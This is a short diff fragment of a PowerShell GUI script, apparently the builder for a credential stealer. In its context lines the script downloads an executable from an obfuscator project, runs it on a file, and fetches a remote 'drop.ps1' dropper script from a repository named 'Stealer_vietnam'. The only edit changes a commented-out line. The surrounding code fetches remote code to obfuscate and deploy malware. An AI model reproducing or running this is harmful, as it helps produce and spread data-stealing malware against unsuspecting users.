@@ -141,7 +141,7 @@ $button.Add_Click({
         Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $protectPath
         # Execute the .bat file
         Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait
-        # Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`"" -NoNewWindow -Wait
+        # Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`" -nu" -NoNewWindow -Wait
         $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
 
         $scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
